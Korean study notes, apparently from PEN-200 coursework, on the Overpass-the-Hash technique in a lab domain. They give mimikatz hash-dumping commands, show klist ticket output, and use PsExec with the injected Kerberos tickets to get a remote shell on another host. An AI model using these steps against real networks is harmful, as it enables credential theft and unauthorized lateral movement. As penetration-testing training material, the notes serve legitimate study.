# 24.1.4 Overpass-the-Hash

> **Overpass the Hash** · PEN-200 §24.1.4

Overpass-the-Hash 는 NTLM 해시를 **Kerberos TGT 로 바꿔치기**하는 기법임. TGT 를 얻으면 그것으로 TGS 를 받을 수 있고, 결과적으로 **NTLM 인증을 네트워크에 흘리지 않고** 이동함. 앞 절의 전통적 Pass-the-Hash 와 갈리는 지점이 바로 이것임.

전제는 대상 사용자가 로그인한 적이 있어 그 머신에 **자격 증명이 캐시돼 있는 것**임. 관리자 셸에서 mimikatz 의 `privilege::debug` 로 디버그 권한을 켜고 `sekurlsa::logonpasswords` 를 돌리면 캐시된 해시가 세션별로 덤프됨. 여기서 대상 사용자의 `NTLM` 값을 확보함.

⚠️ **함정 둘.**

- 새 PowerShell 에서 `whoami` 를 치면 **원래 사용자 이름이 나옴.** 실패가 아님 — `whoami` 는 현재 프로세스 토큰만 보고 주입된 Kerberos 티켓을 보지 않기 때문임. 티켓 상태는 `klist` 로 확인함
- 이 시점의 `klist` 는 티켓이 하나도 없다고 나옴. 대화형 로그온을 한 적이 없어 아직 발급되지 않았기 때문임

```
PS C:\Windows\system32> klist
Current LogonId is 0:0x1583ae
Cached Tickets: (0)
```

TGT 를 실제로 만들려면 **도메인 권한이 필요한 동작을 아무거나 한 번** 하면 됨. 여기서는 네트워크 공유 접근을 씀.

```
PS C:\Windows\system32> net use \\files04
The command completed successfully.
```

```
PS C:\Windows\system32> klist
Current LogonId is 0:0x17239e
Cached Tickets: (2)
#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent
name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com
#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)

        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

**읽는 법 — `Server:` 가 `krbtgt/...` 이면 TGT, 그 외 서비스명이면 TGS 임.** 위에서 #0 이 TGT, #1 은 CIFS 서비스용 TGS 임. `net use` 는 임의로 고른 것이고, 도메인 권한을 요구하는 명령이면 무엇이든 같은 결과를 냄.

이제 **Kerberos 를 쓰는 도구는 전부 재사용 가능**해짐. Microsoft 정품 PsExec 은 해시를 인자로 받지 않지만, 지금 세션이 이미 그 사용자의 티켓을 쥐고 있으므로 자격 증명 없이 그냥 실행하면 됨.

```
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
corp\jen
C:\Windows\system32>hostname
FILES04
```

⚠️ 대상은 **호스트명으로 지정할 것.** IP 로 지정하면 Kerberos 대신 NTLM 이 강제돼 티켓이 무시됨(§24.2.1 에서 실패 예가 나옴).
